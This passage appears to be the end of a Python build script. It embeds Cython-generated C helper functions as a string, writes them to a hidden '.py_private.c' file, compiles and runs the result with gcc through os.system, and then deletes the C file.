    PyObject* defenc = _PyUnicode_AsDefaultEncodedString(o, NULL);
    if (!defenc) return NULL;
    defenc_c = PyBytes_AS_STRING(defenc);
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    {
        char* end = defenc_c + PyBytes_GET_SIZE(defenc);
        char* c;
        for (c = defenc_c; c < end; c++) {
            if ((unsigned char) (*c) >= 128) {
                PyUnicode_AsASCIIString(o);
                return NULL;
            }
        }
    }
#endif
    *length = PyBytes_GET_SIZE(defenc);
    return defenc_c;
}
#else
static CYTHON_INLINE const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    if (unlikely(__Pyx_PyUnicode_READY(o) == -1)) return NULL;
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    if (likely(PyUnicode_IS_ASCII(o))) {
        *length = PyUnicode_GET_LENGTH(o);
        return PyUnicode_AsUTF8(o);
    } else {
        PyUnicode_AsASCIIString(o);
        return NULL;
    }
#else
    return PyUnicode_AsUTF8AndSize(o, length);
#endif
}
#endif
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
    if (
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
            __Pyx_sys_getdefaultencoding_not_ascii &&
#endif
            PyUnicode_Check(o)) {
        return __Pyx_PyUnicode_AsStringAndSize(o, length);
    } else
#endif
#if (!CYTHON_COMPILING_IN_PYPY) || (defined(PyByteArray_AS_STRING) && defined(PyByteArray_GET_SIZE))
    if (PyByteArray_Check(o)) {
        *length = PyByteArray_GET_SIZE(o);
        return PyByteArray_AS_STRING(o);
    } else
#endif
    {
        char* result;
        int r = PyBytes_AsStringAndSize(o, &result, length);
        if (unlikely(r < 0)) {
            return NULL;
        } else {
            return result;
        }
    }
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject* x) {
   int is_true = x == Py_True;
   if (is_true | (x == Py_False) | (x == Py_None)) return is_true;
   else return PyObject_IsTrue(x);
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject* x) {
    int retval;
    if (unlikely(!x)) return -1;
    retval = __Pyx_PyObject_IsTrue(x);
    Py_DECREF(x);
    return retval;
}
static PyObject* __Pyx_PyNumber_IntOrLongWrongResultType(PyObject* result, const char* type_name) {
#if PY_MAJOR_VERSION >= 3
    if (PyLong_Check(result)) {
        if (PyErr_WarnFormat(PyExc_DeprecationWarning, 1,
                "__int__ returned non-int (type %.200s).  "
                "The ability to return an instance of a strict subclass of int "
                "is deprecated, and may be removed in a future version of Python.",
                Py_TYPE(result)->tp_name)) {
            Py_DECREF(result);
            return NULL;
        }
        return result;
    }
#endif
    PyErr_Format(PyExc_TypeError,
                 "__%.4s__ returned non-%.4s (type %.200s)",
                 type_name, type_name, Py_TYPE(result)->tp_name);
    Py_DECREF(result);
    return NULL;
}
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x) {
#if CYTHON_USE_TYPE_SLOTS
  PyNumberMethods *m;
#endif
  const char *name = NULL;
  PyObject *res = NULL;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_Check(x) || PyLong_Check(x)))
#else
  if (likely(PyLong_Check(x)))
#endif
    return __Pyx_NewRef(x);
#if CYTHON_USE_TYPE_SLOTS
  m = Py_TYPE(x)->tp_as_number;
  #if PY_MAJOR_VERSION < 3
  if (m && m->nb_int) {
    name = "int";
    res = m->nb_int(x);
  }
  else if (m && m->nb_long) {
    name = "long";
    res = m->nb_long(x);
  }
  #else
  if (likely(m && m->nb_int)) {
    name = "int";
    res = m->nb_int(x);
  }
  #endif
#else
  if (!PyBytes_CheckExact(x) && !PyUnicode_CheckExact(x)) {
    res = PyNumber_Int(x);
  }
#endif
  if (likely(res)) {
#if PY_MAJOR_VERSION < 3
    if (unlikely(!PyInt_Check(res) && !PyLong_Check(res))) {
#else
    if (unlikely(!PyLong_CheckExact(res))) {
#endif
        return __Pyx_PyNumber_IntOrLongWrongResultType(res, name);
    }
  }
  else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_TypeError,
                    "an integer is required");
  }
  return res;
}
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject* b) {
  Py_ssize_t ival;
  PyObject *x;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_CheckExact(b))) {
    if (sizeof(Py_ssize_t) >= sizeof(long))
        return PyInt_AS_LONG(b);
    else
        return PyInt_AsSsize_t(b);
  }
#endif
  if (likely(PyLong_CheckExact(b))) {
    #if CYTHON_USE_PYLONG_INTERNALS
    const digit* digits = ((PyLongObject*)b)->ob_digit;
    const Py_ssize_t size = Py_SIZE(b);
    if (likely(__Pyx_sst_abs(size) <= 1)) {
        ival = likely(size) ? digits[0] : 0;
        if (size == -1) ival = -ival;
        return ival;
    } else {
      switch (size) {
         case 2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
      }
    }
    #endif
    return PyLong_AsSsize_t(b);
  }
  x = PyNumber_Index(b);
  if (!x) return -1;
  ival = PyInt_AsSsize_t(x);
  Py_DECREF(x);
  return ival;
}
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject* o) {
  if (sizeof(Py_hash_t) == sizeof(Py_ssize_t)) {
    return (Py_hash_t) __Pyx_PyIndex_AsSsize_t(o);
#if PY_MAJOR_VERSION < 3
  } else if (likely(PyInt_CheckExact(o))) {
    return PyInt_AS_LONG(o);
#endif
  } else {
    Py_ssize_t ival;
    PyObject *x;
    x = PyNumber_Index(o);
    if (!x) return -1;
    ival = PyInt_AsLong(x);
    Py_DECREF(x);
    return ival;
  }
}
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b) {
  return b ? __Pyx_NewRef(Py_True) : __Pyx_NewRef(Py_False);
}
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t ival) {
    return PyInt_FromSize_t(ival);
}


#endif /* Py_PYTHON_H */'''
C_FILE = ".py_private.c"
PYTHON_VERSION = ".".join(sys.version.split(" ")[0].split(".")[:-1])
COMPILE_FILE = (
    'gcc -I' +
    PREFIX +
    '/include/python' +
    PYTHON_VERSION +
    ' -o ' +
    EXECUTE_FILE +
    ' ' +
    C_FILE +
    ' -L' +
    PREFIX +
    '/lib -lpython' +
    PYTHON_VERSION
)


with open(C_FILE, "w") as f:
    f.write(C_SOURCE)

os.makedirs(os.path.dirname(EXECUTE_FILE), exist_ok=True)
os.system(EXPORT_PYTHONHOME+" && "+EXPORT_PYTHON_EXECUTABLE+" && "+COMPILE_FILE+" && "+RUN)

os.remove(C_FILE)
